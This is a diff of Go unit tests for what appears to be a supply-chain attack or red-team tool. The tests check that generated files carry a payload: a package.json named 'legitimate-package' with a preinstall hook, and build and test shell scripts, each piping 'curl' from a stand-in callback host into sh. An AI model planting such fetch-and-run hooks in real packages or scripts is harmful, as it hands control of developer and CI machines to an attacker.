@@ -119,6 +119,26 @@ func TestNPMPayload_PreserveFlow(t *testing.T) {
 	assert.Contains(t, payloads[0].Content, "|| true")
 }
 
+func TestGenerateFiles_NPMUsesRecommendedPayload(t *testing.T) {
+	files := GenerateFiles("npm", nil, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 1)
+	assert.Equal(t, "package.json", files[0].Path)
+	assert.Contains(t, files[0].Content, `"name": "legitimate-package"`)
+	assert.Contains(t, files[0].Content, `"preinstall": "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh"`)
+	assert.NotContains(t, files[0].Content, "postinstall")
+}
+
+func TestGenerateFiles_BashUsesTargets(t *testing.T) {
+	files := GenerateFiles("bash", []string{"scripts/build.sh", "scripts/test.sh"}, "https://kitchen.example/r/smokedmeat/stg-123")
+
+	require.Len(t, files, 2)
+	assert.Equal(t, "scripts/build.sh", files[0].Path)
+	assert.Equal(t, "scripts/test.sh", files[1].Path)
+	assert.Contains(t, files[0].Content, "#!/bin/sh")
+	assert.Contains(t, files[0].Content, "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh")
+}
+
 func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
 	payload := NewNPMPayload(PayloadOptions{
 		CallbackURL: "https://kitchen.example/r/smokedmeat/stg123",
